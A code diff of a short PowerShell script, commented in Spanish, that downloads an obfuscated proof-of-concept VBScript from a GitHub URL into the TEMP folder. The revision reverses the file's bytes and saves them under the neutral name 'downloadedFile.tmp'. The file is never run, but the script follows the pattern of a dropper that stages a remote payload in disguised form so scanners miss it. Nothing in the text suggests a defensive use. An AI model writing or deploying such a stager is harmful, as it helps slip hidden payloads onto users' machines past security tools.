@@ -1,17 +1,16 @@
-# Definir la URL del archivo y la ruta de destino
 $url = "https://raw.githubusercontent.com/Jabato96/POCAHK/main/PocOfuscated.vbs"
-$destinationPath = "$env:TEMP\PocOfuscated.vbs"
+$destinationPath = "$env:TEMP\downloadedFile.tmp"
 
-# Descargar el archivo
-Invoke-WebRequest -Uri $url -OutFile $destinationPath
 
-# Leer el contenido del archivo descargado
-$content = Get-Content -Path $destinationPath
+$webClient = New-Object System.Net.WebClient
 
-# Ofuscación simple: reemplazar ciertas letras por números (ejemplo)
-$ofuscatedContent = $content -replace "a", "4" -replace "e", "3" -replace "i", "1" -replace "o", "0" -replace "u", "ü"
 
-# Guardar el contenido ofuscado de nuevo en el archivo
-Set-Content -Path $destinationPath -Value $ofuscatedContent
+$fileBytes = $webClient.DownloadData($url)
+
+
+$ofuscatedBytes = [System.Linq.Enumerable]::Reverse($fileBytes)
+
+
+[System.IO.File]::WriteAllBytes($destinationPath, $ofuscatedBytes)
 
 Write-Host "Archivo descargado y ofuscado guardado en $destinationPath"
